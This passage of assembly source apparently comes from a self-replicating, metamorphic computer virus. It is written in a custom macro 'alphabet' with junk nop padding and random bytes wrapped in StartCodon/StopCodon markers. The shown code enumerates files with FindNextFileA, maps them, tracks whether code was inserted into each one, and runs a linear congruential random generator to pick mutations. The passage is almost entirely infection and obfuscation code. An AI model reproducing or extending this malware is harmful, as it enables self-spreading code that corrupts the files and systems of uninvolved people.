        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _push
               _save
               _and
               _JnzDown
                  ; BC==0
                  _nopREAL
                  _nopREAL
                  _add0001
                  _JnzDown
                       ; BC!=0
                       _nopsA       ; get API offset
                       _call        ; call CloseHandle, dword[HGTMapHandle]
                       _push        ; Trash
                       _nopREAL
               _pop         ; remove trash
               _getDO
db StopCodon
db 177
db 36
db 120
db 186
db 171
db 220
db 58
db 201
db 227
db 19
db 119
db 73
db 240
db 18
db 224
db 1
db 139
db 104
db 82
db 122
db 85
db 208
db 232
db 186
db 192
db 89
db 37
db 180
db 167
db 44
db 93
db 8
db 104
db 201
db 148
db 5
db 156
db 99
db StartCodon
    BigNum=(hCloseHandle-DataOffset)
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 128
db 176
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 138
db 182
db 67
db 28
db 165
db 109
db 250
db 18
db 74
db 167
db 153
db 237
db 74
db 140
db 68
db 16
db 72
db 158
db 64
db 31
db 206
db 8
db 212
db 51
db 113
db 133
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _nopdA       ; Save API in RegA
    _getDO
    BigNum=HGTFileHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _push
               _save
               _and
               _JnzDown
                  ; BC==0
                  _nopREAL
                  _nopREAL
                  _add0001
                  _JnzDown
                       ; BC!=0
                       _nopsA       ; get API offset
                       _call        ; call CloseHandle, dword[HGTFileHandle]
                       _push        ; Trash
                       _nopREAL
               _pop         ; remove trash
    _getDO
    BigNum=HGTDidInsert-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 207
db 120
db 58
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
db StopCodon
db 169
db 185
db 128
db 48
db 188
db 190
db 145
db 147
db 148
db 156
db 6
db 69
db 81
db 51
db 159
db 160
db 64
db 254
db 73
db 137
db 211
db 62
db StartCodon
               _push                ; 0...written / -1...not written
    _getDO
    BigNum=WIN32_FIND_DATA_struct-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _push
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    _getDO
    BigNum=HGT_FFHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 247
db 209
db 25
db 161
db 224
db 34
db 78
db 23
db 244
db 129
db 226
db 16
db 72
db 167
db 227
db 72
db 251
db 235
db 235
db 209
db 176
db 210
db 62
db 208
db 189
db 88
db 196
db 144
db 80
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 32
db 89
db 61
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
               _push
    _getDO
    BigNum=hFindNextFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 15
db 97
db 41
db 101
db 77
db 71
db 219
db 0
db 226
db StartCodon
        _xor   ; BC1=0
        _add0001
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _saveWrtOff             ; BA1=RegC
        _pop
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 64
db 63
db 95
db 219
db 65
db 150
db 227
db 168
db 121
db 100
db 215
db 64
db 133
db 206
db 129
db 102
db 57
db 143
db 23
db 173
db 84
db 137
db 167
db 116
db 84
db 75
db 53
db 164
db 193
db 37
db 52
db 211
db 176
db 83
db 71
db 117
db 101
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
               _pop                     ; HGTDidInsert
               _save
               _nopsA                   ; If nonzero: Next file!
       _and
       _JnzUp                           ; End of the loop
db StopCodon
db 244
db 153
db 87
db 252
db 148
db 212
db 229
db 182
db 176
db 106
db 72
db 13
db 241
db 18
db 171
db 61
db 22
db 197
db 72
db 185
db 57
db 179
db 166
db 110
db 140
db StartCodon
       _push                ; Trash to stack
       HGTEnd1:
       _pop                 ; Align stack (Trash or Return address from _call)
    _getDO
db StopCodon
db StartCodon
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 32
db 205
db 156
db 239
db 240
db 120
db 157
db 237
db 32
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 76
db 241
db 5
db 49
db 3
db 43
db 199
db 64
db 110
db 212
db 181
db 246
db 125
db 230
db 126
db 35
db 182
db 101
db 27
db 122
db 252
db 239
db 10
db 134
db 74
db 16
db 135
db 111
db 252
db 46
db 20
db 115
db 118
db 219
db 71
db 153
db 227
db 154
db 237
db 209
db 233
db 19
db 42
db 68
db 36
db 238
db 142
db 36
db 67
db 245
db 208
db 177
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
db StopCodon
db 133
db 224
db 97
db 8
db 91
db 224
db 23
db 42
db 242
db 144
db 88
db 67
db 84
db 133
db 207
db 254
db 93
db 182
db 135
db 186
db 57
db 156
db 147
db 43
db 132
db 55
db 138
db 182
db 8
db 33
db 43
db 87
db 77
db 100
db 181
db 111
db 75
db 183
db 125
db 213
db 167
db 187
db 156
db 20
db 31
db 51
db 171
db 9
db 98
db 166
db 133
db 156
db 140
db 33
db 10
db StartCodon
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 238
db 233
db 151
db 63
db 47
db 107
db 64
db 17
db 155
db 28
db 185
db 112
db 218
db 120
db 93
db 214
db 54
db 116
db 118
db 62
db 228
db 214
db 117
db 195
db 227
db 237
db 131
db 83
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 41
db 18
db 145
db 216
db 118
db 147
db 41
db StartCodon
        _pushall        ; Restore ZF
db StopCodon
db 172
db 179
db 44
db 172
db 200
db 168
db 52
db 206
db 41
db 96
db 128
db 165
db 57
db 146
db 140
db 55
db 165
db 207
db 29
db 94
db 235
db 31
db 146
db 118
db 118
db 52
db 204
db StartCodon
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 242
db 223
db StartCodon
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
    _getDO
    BigNum=RPAminoAcid1-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 23
db 8
db 56
db 187
db 241
db 164
db 248
db 68
db 66
db 213
db 18
db 239
db 5
db 126
db 37
db 142
db 252
db 85
db 93
db 221
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA                   ; mov eax, [RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdD                   ; mov edx, 0
    BigNum=256
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div                     ; div ebx
       _nopsD                   ; BC1=rand%256
       _writeDWord              ; Save amino acid to compare.
       _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=3
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 219
db 127
db 71
db 184
db 105
db 163
db 186
db 182
db 7
db 91
db 134
db 71
db 140
db 51
db 38
db 146
db 187
db 107
db 154
db 20
db 30
db 23
db 61
db 25
db 253
db 57
db 150
db 130
db 31
db 234
db 214
db 49
db 222
db 140
db 116
db 68
db 0
db 46
db 87
db 181
db 252
db 63
db 199
db 236
db 117
db 145
db 201
db 36
db 158
db 172
db 52
db 36
db 197
db 85
db 110
db 101
db 22
db 31
db 11
db 166
db 73
db 140
db 76
db 96
db 112
db 212
db 32
db 7
db 174
db 24
db 68
db 19
db 230
db 102
db 128
db 140
db 241
db 220
db 72
db 65
db 186
db 199
db 108
db 80
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
       _pop
       _shl                     ; BC1=(rand%256)*8
       _save
    _getDO
db StopCodon
db 17
db 29
db 111
db 27
db 55
db 124
db 48
db 75
db 16
db StartCodon
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 37
db 3
db 44
db 44
db 235
db 122
db 4
db 31
db 171
db 57
db 245
db 83
db 89
db 86
db 182
db 226
db 123
db 121
db 43
db 38
db 98
db 23
db 233
db 54
db 29
db 231
db 174
db 234
db 141
db 114
db 64
db 248
db 173
db 40
db 78
db 159
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _addsaved                ; MapPoint+(rand%256)*8
    BigNum=(CodeStart+(StartAlphabeth-start))
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
